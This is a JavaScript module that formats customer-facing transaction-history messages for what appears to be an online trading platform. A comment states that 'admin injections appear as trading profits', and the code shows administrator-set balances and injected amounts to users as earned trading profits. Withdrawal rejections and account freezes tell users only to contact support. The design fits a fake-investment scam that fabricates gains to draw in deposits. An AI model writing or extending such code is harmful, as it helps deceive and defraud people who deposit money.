// Format history messages professionally
export function formatHistoryMessage(action, meta = {}) {
  const amt = meta.amount || meta.amt || 0;
  const formattedAmount = typeof amt === 'number' 
    ? `$${amt.toLocaleString(undefined, {minimumFractionDigits:2, maximumFractionDigits:2})}` 
    : amt;
  
  const messages = {
    // Deposits
    'deposit.submitted': `Deposit request submitted - ${formattedAmount}`,
    'deposit.confirmed': `Deposit completed - ${formattedAmount} credited to your account`,
    'deposit.rejected': `Deposit rejected - ${meta.reason || 'Verification failed'}`,
    
    // Withdrawals
    'withdraw.request': `Withdrawal request submitted - ${formattedAmount}`,
    'withdraw.approved': `Withdrawal approved - ${formattedAmount} will be sent shortly`,
    'withdraw.rejected': `Withdrawal rejected - Please contact support`,
    
    // Trading profits (admin injections appear as trading profits)
    'admin.injectProfit': `Trading profit - ${formattedAmount} earned`,
    'admin.dailyProfit': `Daily trading profit - ${formattedAmount}`,
    'profit.trading': `Position closed - ${formattedAmount} profit`,
    
    // Balance updates
    'admin.setBalance': `Account adjustment - Balance updated to ${formattedAmount}`,
    
    // Account actions
    'account.created': `Welcome! Account created successfully`,
    'account.login': `Login successful`,
    'profile.updated': `Profile updated - ${(meta.fields || []).join(', ')}`,
    'password.changed': `Password changed successfully`,
    
    // Admin actions
    'admin.freeze': `Account temporarily restricted - Please contact support`,
    'admin.unfreeze': `Account restrictions removed`,
    'admin.liquidation': `Position liquidated - ${meta.reason || 'Margin call'}`,
    'admin.bonus': `Bonus credited - ${formattedAmount}`,
    
    // Default
    'default': `Transaction - ${action.replace(/\./g, ' ')}`
  };
  
  return messages[action] || messages['default'];
}

export function createHistoryEntry(action, meta = {}) {
  return {
    action,
    message: formatHistoryMessage(action, meta),
    meta: JSON.stringify(meta || {}),
  };
}
